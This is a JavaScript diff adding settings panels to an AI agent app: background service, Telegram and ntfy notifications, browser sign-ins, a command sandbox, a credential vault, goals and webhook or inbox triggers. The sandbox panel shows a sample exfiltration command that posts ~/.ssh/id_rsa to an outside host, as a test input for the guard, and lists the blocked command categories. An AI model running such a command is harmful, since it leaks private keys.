@@ -2970,7 +2970,7 @@ async function loadPhone() {
   const list = $("#phoneSteps");
   list.innerHTML = "<div class='out-empty'>Checking\u2026</div>";
   try {
-    const d = await fetch("/api/phone").then(r => r.json());
+    const d = await fetch("/api/phone/setup").then(r => r.json());
     _phoneUrl = d.url || "";
     $("#phoneUrl").textContent = d.url || "";
     list.innerHTML = "";
@@ -5506,6 +5506,252 @@ async function loadModelPickers() {
   thRow.append(thInfo, thCtrl);
   box.appendChild(thRow);
 
+  // the background service: schedules keep running with the window closed
+  const svRow = el("div", "set-row");
+  const svInfo = el("div", "set-info");
+  const svNm = el("div", "set-name"); svNm.textContent = "Run in the background";
+  const svDs = el("div", "set-desc");
+  svDs.textContent = "Start Agent Jo when you log in and restart it if it stops, so schedules, watchers and auto-resume keep going with this window closed. It runs as you, with no administrator prompt.";
+  svInfo.append(svNm, svDs);
+  const svCtrl = el("div", "set-control");
+  svCtrl.style.cssText = "display:flex;flex-direction:column;gap:6px;align-items:flex-start;min-width:280px";
+  svRow.append(svInfo, svCtrl);
+  box.appendChild(svRow);
+  const drawService = async (msg) => {
+    let st = {};
+    try { st = await fetch("/api/service").then((r) => r.json()); } catch (e) { return; }
+    svCtrl.innerHTML = "";
+    const b = el("button"); b.className = "btn btn-mini" + (st.installed ? "" : " primary");
+    b.textContent = st.installed ? "Remove" : "Install";
+    b.addEventListener("click", async () => {
+      b.disabled = true;
+      let r = {};
+      try {
+        r = await fetch("/api/service", { method: "POST", headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ install: !st.installed }) }).then((x) => x.json());
+      } catch (e) { r = { error: String(e) }; }
+      drawService(r.ok ? (r.note || "Done.") : ("Couldn't: " + (r.error || "unknown error")));
+    });
+    svCtrl.appendChild(b);
+    const s = el("div", "set-desc");
+    s.textContent = st.installed
+      ? (st.running ? "Installed and running." : "Installed, not running right now (" + (st.detail || "stopped") + ").")
+      : "Not installed: schedules run only while a window is open.";
+    svCtrl.appendChild(s);
+    if (msg) { const m = el("div", "set-desc"); m.textContent = msg; svCtrl.appendChild(m); }
+  };
+  drawService();
+
+  // notifications: ntfy push and a Telegram bot with Approve / Refuse buttons
+  const ntRow = el("div", "set-row");
+  const ntInfo = el("div", "set-info");
+  const ntNm = el("div", "set-name"); ntNm.textContent = "Phone notifications";
+  const ntDs = el("div", "set-desc");
+  ntDs.textContent = "Hear about it when something needs you: a held email, a failed schedule, a blocked task. ntfy pushes to the free ntfy app. A Telegram bot also lets you approve or refuse from the message, from anywhere. Only a one-line summary leaves the machine.";
+  ntInfo.append(ntNm, ntDs);
+  const ntCtrl = el("div", "set-control");
+  ntCtrl.style.cssText = "display:flex;flex-direction:column;gap:6px;align-items:stretch;min-width:300px";
+  ntRow.append(ntInfo, ntCtrl);
+  box.appendChild(ntRow);
+  const drawNotify = async (msg) => {
+    let st = {};
+    try { st = await fetch("/api/notify").then((r) => r.json()); } catch (e) { return; }
+    ntCtrl.innerHTML = "";
+    const field = (ph, val, type) => {
+      const i = el("input"); i.className = "model-select"; i.placeholder = ph;
+      i.value = val || ""; if (type) i.type = type; return i;
+    };
+    const tick = (label, on) => {
+      const w = el("label"); w.className = "set-desc";
+      w.style.cssText = "display:flex;gap:6px;align-items:center";
+      const c = el("input"); c.type = "checkbox"; c.checked = !!on;
+      const t = el("span"); t.textContent = label; w.append(c, t); return [w, c];
+    };
+    const [nW, nOn] = tick("ntfy push", st.ntfy && st.ntfy.enabled);
+    const nTopic = field("topic, e.g. agentjo-7f3k2q (hard to guess)", st.ntfy && st.ntfy.topic);
+    const nServer = field("server (default https://ntfy.sh)", st.ntfy && st.ntfy.server);
+    const [tW, tOn] = tick("Telegram bot", st.telegram && st.telegram.enabled);
+    const tTok = field(st.telegram && st.telegram.token ? "bot token (saved; paste to replace)" : "bot token from @BotFather", "", "password");
+    const tChat = field("your chat id", st.telegram && st.telegram.chat_id);
+    const find = el("button"); find.className = "btn btn-mini"; find.textContent = "Find my chat";
+    find.title = "Send your bot any message in Telegram first";
+    find.addEventListener("click", async () => {
+      const r = await fetch("/api/notify/telegram/chat", { method: "POST", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ token: tTok.value }) }).then((x) => x.json()).catch((e) => ({ error: String(e) }));
+      if (r.ok) tChat.value = r.chat_id; else alert(r.error || "Couldn't find it.");
+    });
+    const evs = el("div"); evs.style.cssText = "display:flex;flex-direction:column;gap:2px";
+    const evBoxes = {};
+    Object.entries(st.event_labels || {}).forEach(([k, label]) => {
+      const [w, c] = tick(label, (st.events || {})[k]); evBoxes[k] = c; evs.appendChild(w);
+    });
+    const btns = el("div"); btns.style.cssText = "display:flex;gap:6px";
+    const save = el("button"); save.className = "btn btn-mini primary"; save.textContent = "Save";
+    save.addEventListener("click", async () => {
+      const events = {}; Object.entries(evBoxes).forEach(([k, c]) => { events[k] = c.checked; });
+      await fetch("/api/notify", { method: "POST", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ ntfy: { enabled: nOn.checked, topic: nTopic.value, server: nServer.value || "https://ntfy.sh" },
+          telegram: { enabled: tOn.checked, token: tTok.value, chat_id: tChat.value }, events }) });
+      drawNotify("Saved.");
+    });
+    const test = el("button"); test.className = "btn btn-mini"; test.textContent = "Send a test";
+    test.addEventListener("click", async () => {
+      const r = await fetch("/api/notify/test", { method: "POST" }).then((x) => x.json()).catch((e) => ({ error: String(e) }));
+      drawNotify(r.ok ? "Sent. Check your phone." : ("Didn't arrive: " + (r.error || JSON.stringify(r.channels || {}))));
+    });
+    btns.append(save, test);
+    const tRow = el("div"); tRow.style.cssText = "display:flex;gap:6px"; tChat.style.flex = "1"; tRow.append(tChat, find);
+    ntCtrl.append(nW, nTopic, nServer, tW, tTok, tRow, evs, btns);
+    if (st.poller && st.poller.error) { const e = el("div", "set-desc"); e.textContent = "Telegram: " + st.poller.error; ntCtrl.appendChild(e); }
+    if (msg) { const m = el("div", "set-desc"); m.textContent = msg; ntCtrl.appendChild(m); }
+  };
+  drawNotify();
+
+  // the agent's own browser: signed-in sessions, and where it may act freely
+  const brRow = el("div", "set-row");
+  const brInfo = el("div", "set-info");
+  const brNm = el("div", "set-name"); brNm.textContent = "Browser";
+  const brDs = el("div", "set-desc");
+  brDs.textContent = "Agent Jo can drive a real browser for pages behind a login, built by scripts, or with forms. Reading and following links run freely. Pressing a button that sends a form waits for your OK, with every field shown, unless you list the site below. It never types passwords: sign in yourself once and it stays signed in.";
+  brInfo.append(brNm, brDs);
+  const brCtrl = el("div", "set-control");
+  brCtrl.style.cssText = "display:flex;flex-direction:column;gap:6px;align-items:stretch;min-width:300px";
+  brRow.append(brInfo, brCtrl);
+  box.appendChild(brRow);
+  const drawBrowser = async (msg) => {
+    let st = {};
+    try { st = await fetch("/api/browser").then((r) => r.json()); } catch (e) { return; }
+    brCtrl.innerHTML = "";
+    const say = (t) => { const d = el("div", "set-desc"); d.textContent = t; brCtrl.appendChild(d); };
+    if (!st.installed) { say(st.why || "Not installed."); if (msg) say(msg); return; }
+    const free = el("input"); free.className = "model-select";
+    free.placeholder = "act freely on, e.g. github.com, mysite.co.za";
+    free.value = (st.act_freely_on || []).join(", ");
+    const save = el("button"); save.className = "btn btn-mini"; save.textContent = "Save sites";
+    save.addEventListener("click", async () => {
+      await fetch("/api/browser", { method: "POST", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ act_freely_on: free.value.split(",").map((x) => x.trim()).filter(Boolean) }) });
+      drawBrowser("Saved.");
+    });
+    const sRow = el("div"); sRow.style.cssText = "display:flex;gap:6px"; free.style.flex = "1"; sRow.append(free, save);
+    const url = el("input"); url.className = "model-select"; url.placeholder = "site to sign in to, e.g. linkedin.com";
+    url.style.flex = "1";
+    const go = el("button"); go.className = "btn btn-mini primary"; go.textContent = st.window_open ? "Done signing in" : "Sign in to a site";
+    go.addEventListener("click", async () => {
+      if (st.window_open) {
+        await fetch("/api/browser/login/done", { method: "POST" }); drawBrowser("Signed in. The agent uses this from now on."); return;
+      }
+      if (!url.value.trim()) { drawBrowser("Type the site first."); return; }
+      const r = await fetch("/api/browser/login", { method: "POST", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ url: url.value.trim() }) });
+      const d = await r.json().catch(() => ({}));
+      drawBrowser(r.ok ? d.note : errText(d, "Couldn't open a window."));
+    });
+    const lRow = el("div"); lRow.style.cssText = "display:flex;gap:6px"; lRow.append(url, go);
+    const forget = el("button"); forget.className = "btn btn-mini"; forget.textContent = "Forget all sign-ins";
+    forget.addEventListener("click", async () => {
+      if (!confirm("Sign the agent's browser out of every site?")) return;
+      await fetch("/api/browser/forget", { method: "POST" }); drawBrowser("Forgotten.");
+    });
+    brCtrl.append(sRow, lRow, forget);
+    if (msg) say(msg);
+  };
+  drawBrowser();
+
+  // the sandbox: what commands may do when nobody is watching
+  const sbRow = el("div", "set-row");
+  const sbInfo = el("div", "set-info");
+  const sbNm = el("div", "set-name"); sbNm.textContent = "Sandbox";
+  const sbDs = el("div", "set-desc");
+  sbDs.textContent = "What shell commands may do in unattended runs (schedules, goals, triggers, the crew). Guard refuses the dangerous ones (wiping disks, sudo, reading ~/.ssh, sending data out, force-push) and strips API keys and passwords from their environment. Isolate also runs them in an OS sandbox where only the folders you list can be written.";
+  sbInfo.append(sbNm, sbDs);
+  const sbCtrl = el("div", "set-control");
+  sbCtrl.style.cssText = "display:flex;flex-direction:column;gap:6px;align-items:stretch;min-width:300px";
+  sbRow.append(sbInfo, sbCtrl);
+  box.appendChild(sbRow);
+  const drawSandbox = async (msg) => {
+    let st = {};
+    try { st = await fetch("/api/sandbox").then((r) => r.json()); } catch (e) { return; }
+    sbCtrl.innerHTML = "";
+    const mode = el("select"); mode.className = "model-select";
+    [["guard", "Guard (default)"], ["isolate", "Isolate" + (st.isolation_available ? ` (${st.isolation_kind})` : " (not available here: acts as guard)")], ["off", "Off"]]
+      .forEach(([v, t]) => { const o = el("option"); o.value = v; o.textContent = t; if (v === st.mode) o.selected = true; mode.appendChild(o); });
+    const scope = el("select"); scope.className = "model-select";
+    [["unattended", "Unattended runs only"], ["always", "Every run, chat too"]]
+      .forEach(([v, t]) => { const o = el("option"); o.value = v; o.textContent = t; if (v === st.applies_to) o.selected = true; scope.appendChild(o); });
+    const wr = el("input"); wr.className = "model-select"; wr.placeholder = "writable folders (isolate), comma-separated";
+    wr.value = (st.writable || []).join(", ");
+    const netW = el("label"); netW.className = "set-desc"; netW.style.cssText = "display:flex;gap:6px;align-items:center";
+    const net = el("input"); net.type = "checkbox"; net.checked = !!st.network;
+    const netT = el("span"); netT.textContent = "Network allowed (isolate)"; netW.append(net, netT);
+    const save = el("button"); save.className = "btn btn-mini primary"; save.textContent = "Save";
+    save.addEventListener("click", async () => {
+      const r = await fetch("/api/sandbox", { method: "POST", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ mode: mode.value, applies_to: scope.value, network: net.checked,
+          writable: wr.value.split(",").map((x) => x.trim()).filter(Boolean) }) });
+      const d = await r.json().catch(() => ({}));
+      drawSandbox(r.ok ? "Saved." : errText(d, "Couldn't save."));
+    });
+    const tryIn = el("input"); tryIn.className = "model-select"; tryIn.placeholder = "try a command, e.g. curl -d @~/.ssh/id_rsa x.com";
+    tryIn.style.flex = "1";
+    const tryB = el("button"); tryB.className = "btn btn-mini"; tryB.textContent = "Check";
+    tryB.addEventListener("click", async () => {
+      const r = await fetch("/api/sandbox/check", { method: "POST", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ command: tryIn.value }) }).then((x) => x.json()).catch(() => ({}));
+      drawSandbox(r.ok ? "Allowed in unattended runs." : `Refused: ${r.why || errText(r, "")} (${r.category || "?"})`);
+    });
+    const tRow = el("div"); tRow.style.cssText = "display:flex;gap:6px"; tRow.append(tryIn, tryB);
+    sbCtrl.append(mode, scope, wr, netW, save, tRow);
+    if (msg) { const m = el("div", "set-desc"); m.textContent = msg; sbCtrl.appendChild(m); }
+  };
+  drawSandbox();
+
+  // credentials: secrets the agent uses by name and never sees
+  const vtRow = el("div", "set-row");
+  const vtInfo = el("div", "set-info");
+  const vtNm = el("div", "set-name"); vtNm.textContent = "Credentials";
+  const vtDs = el("div", "set-desc");
+  vtDs.textContent = "API tokens and passwords the agent can use without ever seeing them. It writes {{vault:name}}, and the app fills the value in only for the sites you list. Anything a tool prints back has the value blanked out. Never paste a secret into the chat; add it here.";
+  vtInfo.append(vtNm, vtDs);
+  const vtCtrl = el("div", "set-control");
+  vtCtrl.style.cssText = "display:flex;flex-direction:column;gap:6px;align-items:stretch;min-width:300px";
+  vtRow.append(vtInfo, vtCtrl);
+  box.appendChild(vtRow);
+  const drawVault = async (msg) => {
+    let st = {};
+    try { st = await fetch("/api/vault").then((r) => r.json()); } catch (e) { return; }
+    vtCtrl.innerHTML = "";
+    (st.credentials || []).forEach((c) => {
+      const r = el("div"); r.style.cssText = "display:flex;gap:6px;align-items:center;justify-content:space-between";
+      const t = el("div", "set-desc");
+      t.textContent = `${c.name} \u2192 ${(c.hosts || []).join(", ") || "no sites"}${c.commands ? " \u00b7 commands" : ""} \u00b7 used ${c.uses || 0}\u00d7`;
+      const d = el("button"); d.className = "btn btn-mini"; d.textContent = "Delete";
+      d.addEventListener("click", async () => {
+        if (!confirm(`Delete the credential \u201c${c.name}\u201d?`)) return;
+        await fetch(`/api/vault/${encodeURIComponent(c.name)}`, { method: "DELETE" }); drawVault("Deleted.");
+      });
+      r.append(t, d); vtCtrl.appendChild(r);
+    });
+    const f = (ph, type) => { const i = el("input"); i.className = "model-select"; i.placeholder = ph; if (type) i.type = type; return i; };
+    const nm = f("name, e.g. github"); const val = f("the secret", "password");
+    const hosts = f("sites it may be sent to, e.g. api.github.com, github.com");
+    const note = f("note (optional), e.g. fine-grained token, repo scope");
+    const cw = el("label"); cw.className = "set-desc"; cw.style.cssText = "display:flex;gap:6px;align-items:center";
+    const cmd = el("input"); cmd.type = "checkbox"; const cmt = el("span"); cmt.textContent = "Commands may use it (as $VAULT_NAME)"; cw.append(cmd, cmt);
+    const add = el("button"); add.className = "btn btn-mini primary"; add.textContent = "Save credential";
+    add.addEventListener("click", async () => {
+      const r = await fetch("/api/vault", { method: "POST", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ name: nm.value.trim(), value: val.value, note: note.value.trim(), commands: cmd.checked,
+          hosts: hosts.value.split(",").map((x) => x.trim()).filter(Boolean) }) });
+      const d = await r.json().catch(() => ({}));
+      val.value = "";
+      drawVault(r.ok ? `Saved. The agent can use it as {{vault:${d.name}}}.` : errText(d, "Couldn't save it."));
+    });
+    vtCtrl.append(nm, val, hosts, note, cw, add);
+    if (msg) { const m = el("div", "set-desc"); m.textContent = msg; vtCtrl.appendChild(m); }
+  };
+  drawVault();
+
   // the phone companion: approve held calls and pause schedules from your phone
   const phRow = el("div", "set-row");
   const phInfo = el("div", "set-info");
@@ -6208,8 +6454,12 @@ function closeSched() { const m = $("#schedModal"); m.hidden = true; m.style.dis
 function switchSchedTab(tab) {
   $("#schedTabSchedules").classList.toggle("active", tab === "schedules");
   $("#schedTabTasks").classList.toggle("active", tab === "tasks");
+  $("#schedTabGoals").classList.toggle("active", tab === "goals");
+  $("#schedTabTriggers").classList.toggle("active", tab === "triggers");
+  $("#schedPaneTriggers").hidden = tab !== "triggers";
   $("#schedPaneSchedules").hidden = tab !== "schedules";
   $("#schedPaneTasks").hidden = tab !== "tasks";
+  $("#schedPaneGoals").hidden = tab !== "goals";
 }
 function populateSchedEngines() {
   const sel = $("#schEngine"); sel.innerHTML = "";
@@ -6330,6 +6580,164 @@ async function runSchedule(id, name) {
 async function deleteSchedule(id) {
   try { renderSchedules((await fetch(`/api/schedules/${id}`, { method: "DELETE" }).then(r => r.json())).schedules || []); }
   catch (e) { setSchedStatus("Could not delete.", "err"); }
+}
+async function loadGoals() {
+  let d = {};
+  try { d = await fetch("/api/goals").then(r => r.json()); } catch (e) { return; }
+  const list = $("#goalList"); list.innerHTML = "";
+  const goals = d.goals || [];
+  if (!goals.length) {
+    const e = el("div", "out-empty"); e.textContent = "No goals yet. Set one above, or ask in chat: \u201cmake it a goal to\u2026\u201d.";
+    list.appendChild(e); return;
+  }
+  goals.forEach((g) => {
+    const row = el("div", "mem-item");
+    const head = el("div", "mem-text");
+    const t = el("strong"); t.textContent = `#${g.id} ${g.title}`;
+    const meta = el("div", "log-meta");
+    const bits = [g.status, `${(g.runs || []).length} run(s)`];
+    if (g.deadline) bits.push("due " + g.deadline);
+    if (g.budget_usd) bits.push(`$${(g.spent_usd || 0).toFixed(2)} of $${g.budget_usd.toFixed(2)}`);
+    meta.textContent = bits.join(" \u00b7 ");
+    head.append(t, meta);
+    const last = [...(g.notes || [])].reverse().find((n) => n.kind !== "active");
+    if (last) { const n = el("div", "log-meta"); n.textContent = `${last.at} [${last.kind}] ${last.text}`.slice(0, 400); head.appendChild(n); }
+    const acts = el("div"); acts.style.cssText = "display:flex;gap:6px;flex-wrap:wrap;margin-top:4px";
+    const btn = (label, fn) => { const b = el("button"); b.className = "btn btn-mini"; b.textContent = label; b.addEventListener("click", () => fn()); acts.appendChild(b); };
+    const setSt = (st) => async () => {
+      await fetch(`/api/goals/${g.id}/status`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ status: st }) });
+      loadGoals();
+    };
+    if (g.status === "active") {
+      btn("Run now", async () => {
+        const r = await fetch(`/api/goals/${g.id}/run`, { method: "POST" }).then(x => x.json()).catch(() => ({}));
+        $("#glStatus").textContent = r.note || errText(r, "");
+      });
+      btn("Pause", setSt("paused"));
+    } else if (!["achieved", "abandoned"].includes(g.status)) {
+      btn("Resume", setSt("active"));
+    }
+    if (g.status !== "abandoned" && g.status !== "achieved") btn("Give up", setSt("abandoned"));
+    btn("Delete", async () => {
+      if (!confirm(`Delete goal #${g.id} and its history?`)) return;
+      await fetch(`/api/goals/${g.id}`, { method: "DELETE" }); loadGoals();
+    });
+    head.appendChild(acts);
+    row.appendChild(head);
+    list.appendChild(row);
+  });
+}
+function updateTriggerFields() {
+  const k = $("#trKind").value;
+  $("#trInboxFields").hidden = k !== "inbox";
+  $("#trFolderFields").hidden = k !== "folder";
+}
+async function loadTriggers(secretNote) {
+  let d = {}, gs = {};
+  try { d = await fetch("/api/triggers").then(r => r.json()); } catch (e) { return; }
+  try { gs = await fetch("/api/goals").then(r => r.json()); } catch (e) {}
+  const sel = $("#trGoal"); const keep = sel.value;
+  sel.innerHTML = "<option value=''>(no goal: run the instruction)</option>";
+  (gs.goals || []).filter((g) => g.status === "active").forEach((g) => {
+    const o = el("option"); o.value = g.id; o.textContent = `#${g.id} ${g.title}`; sel.appendChild(o);
+  });
+  sel.value = keep;
+  const list = $("#triggerList"); list.innerHTML = "";
+  if (secretNote) {
+    const n = el("div", "mem-item"); n.style.whiteSpace = "pre-wrap"; n.textContent = secretNote; list.appendChild(n);
+  }
+  const ts = d.triggers || [];
+  if (!ts.length) { const e = el("div", "out-empty"); e.textContent = "No triggers yet."; list.appendChild(e); return; }
+  ts.forEach((t) => {
+    const row = el("div", "mem-item");
+    const head = el("div", "mem-text");
+    const ttl = el("strong"); ttl.textContent = t.name;
+    const meta = el("div", "log-meta");
+    const where = t.kind === "webhook" ? `POST ${location.origin}${t.path}`
+      : t.kind === "inbox" ? `${(t.imap || {}).user || ""} \u00b7 ${(t.imap || {}).mailbox || "INBOX"}`
+      : `${t.folder} \u00b7 ${t.pattern}`;
+    const st = t.state || {};
+    meta.textContent = [t.enabled ? "on" : "off", t.kind, where,
+      t.goal_id ? `wakes goal #${t.goal_id}` : "runs the instruction",
+      `${st.fires || 0} fire(s)`, st.dropped ? `${st.dropped} dropped (hourly cap)` : ""].filter(Boolean).join(" \u00b7 ");
+    head.append(ttl, meta);
+    const last = st.error ? `Couldn't look: ${st.error}` : (st.last_summary ? `[${st.last_status}] ${st.last_summary}` : "");
+    if (last) { const l = el("div", "log-meta"); l.textContent = last; head.appendChild(l); }
+    const acts = el("div"); acts.style.cssText = "display:flex;gap:6px;flex-wrap:wrap;margin-top:4px";
+    const btn = (label, fn) => { const b = el("button"); b.className = "btn btn-mini"; b.textContent = label; b.addEventListener("click", () => fn()); acts.appendChild(b); };
+    btn("Test", async () => {
+      const r = await fetch(`/api/triggers/${t.id}/test`, { method: "POST" }).then(x => x.json()).catch(() => ({}));
+      $("#trStatus").textContent = r.note || errText(r, "");
+    });
+    btn(t.enabled ? "Turn off" : "Turn on", async () => {
+      await fetch(`/api/triggers/${t.id}`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ enabled: !t.enabled }) });
+      loadTriggers();
+    });
+    if (t.kind === "webhook") btn("New secret", async () => {
+      if (!confirm("Make a new secret? Whatever calls this webhook must be updated.")) return;
+      const r = await fetch(`/api/triggers/${t.id}/rotate`, { method: "POST" }).then(x => x.json()).catch(() => ({}));
+      loadTriggers(r.secret ? `New secret for ${t.name} (shown once, copy it now):\n${r.secret}` : errText(r, ""));
+    });
+    btn("Delete", async () => {
+      if (!confirm(`Delete trigger \u201c${t.name}\u201d?`)) return;
+      await fetch(`/api/triggers/${t.id}`, { method: "DELETE" }); loadTriggers();
+    });
+    head.appendChild(acts); row.appendChild(head); list.appendChild(row);
+  });
+}
+async function createTrigger() {
+  const kind = $("#trKind").value;
+  const body = {
+    name: $("#trName").value.trim(), kind, instruction: $("#trInstruction").value.trim(),
+    goal_id: $("#trGoal").value ? parseInt($("#trGoal").value, 10) : null,
+    full_access: $("#trFull").checked, max_per_hour: parseInt($("#trMax").value, 10) || 12,
+    from_contains: $("#trFrom").value.trim(), subject_contains: $("#trSubject").value.trim(),
+    folder: $("#trFolder").value.trim(), pattern: $("#trPattern").value.trim() || "*",
+  };
+  if (kind === "inbox") body.imap = { host: $("#trHost").value.trim(), port: parseInt($("#trPort").value, 10) || 993,
+    user: $("#trUser").value.trim(), password: $("#trPass").value, mailbox: $("#trMailbox").value.trim() || "INBOX" };
+  const r = await fetch("/api/triggers", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) });
+  const d = await r.json().catch(() => ({}));
+  if (!r.ok) { $("#trStatus").textContent = errText(d, "Couldn't add it."); return; }
+  $("#trStatus").textContent = `Added \u201c${d.name}\u201d.`;
+  ["#trName", "#trInstruction", "#trPass", "#trFrom", "#trSubject", "#trFolder", "#trPattern", "#trMax"].forEach((x) => { $(x).value = ""; });
+  const note = d.secret
+    ? `Webhook for ${d.name}:\n  POST ${location.origin}${d.path}\n  Authorization: Bearer ${d.secret}\n` +
+      `For GitHub, use the secret as the webhook secret (signatures are checked).\nThe secret is shown once; copy it now.`
+    : "";
+  loadTriggers(note);
+}
+function parseGoalChecks(text) {
+  // one per line: file <path> [contains <text>] | url <url> [contains <text>] | command <cmd>
+  const out = [];
+  for (const raw of (text || "").split("\n")) {
+    const line = raw.trim(); if (!line) continue;
+    const m = line.match(/^(file|url|command)\s+(.+)$/i);
+    if (!m) throw new Error(`Can't read the check \u201c${line}\u201d. Start it with file, url or command.`);
+    const kind = m[1].toLowerCase(); let rest = m[2].trim();
+    if (kind === "command") { out.push({ type: "command", command: rest }); continue; }
+    const c = rest.match(/^(.+?)\s+contains\s+(.+)$/i);
+    if (kind === "file") out.push(c ? { type: "file_contains", path: c[1].trim(), text: c[2].trim() } : { type: "file_exists", path: rest });
+    else out.push(c ? { type: "url", url: c[1].trim(), contains: c[2].trim() } : { type: "url", url: rest });
+  }
+  return out;
+}
+async function createGoal() {
+  let checks = [];
+  try { checks = parseGoalChecks($("#glChecks").value); } catch (e) { $("#glStatus").textContent = e.message; return; }
+  const body = {
+    checks,
+    title: $("#glTitle").value.trim(), objective: $("#glObjective").value.trim(),
+    success: $("#glSuccess").value.trim(), deadline: $("#glDeadline").value || "",
+    budget_usd: parseFloat($("#glBudget").value) || 0, runs_per_day: parseInt($("#glRuns").value, 10) || 4,
+    full_access: $("#glFull").checked,
+  };
+  const r = await fetch("/api/goals", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) });
+  const d = await r.json().catch(() => ({}));
+  if (!r.ok) { $("#glStatus").textContent = errText(d, "Couldn't set it."); return; }
+  $("#glStatus").textContent = `Goal #${d.id} set. The first run starts within the hour.`;
+  ["#glTitle", "#glObjective", "#glSuccess", "#glChecks", "#glDeadline", "#glBudget", "#glRuns"].forEach((s) => { $(s).value = ""; });
+  loadGoals();
 }
 async function loadTasks() {
   try { renderTasks((await fetch("/api/tasks").then(r => r.json())).tasks || []); }
@@ -7283,6 +7691,11 @@ $("#projectFilter").addEventListener("change", async (e) => {
   $("#schedModal").addEventListener("click", (e) => { if (e.target === $("#schedModal")) closeSched(); });
   $("#schedTabSchedules").addEventListener("click", () => switchSchedTab("schedules"));
   $("#schedTabTasks").addEventListener("click", () => { switchSchedTab("tasks"); loadTasks(); });
+  $("#schedTabGoals").addEventListener("click", () => { switchSchedTab("goals"); loadGoals(); });
+  $("#glCreateBtn").addEventListener("click", createGoal);
+  $("#schedTabTriggers").addEventListener("click", () => { switchSchedTab("triggers"); loadTriggers(); });
+  $("#trKind").addEventListener("change", updateTriggerFields);
+  $("#trCreateBtn").addEventListener("click", createTrigger);
   $("#arSaveBtn").addEventListener("click", saveAutoResume);
   $("#arPreviewBtn").addEventListener("click", previewAutoResume);
   $("#arRunBtn").addEventListener("click", runAutoResume);
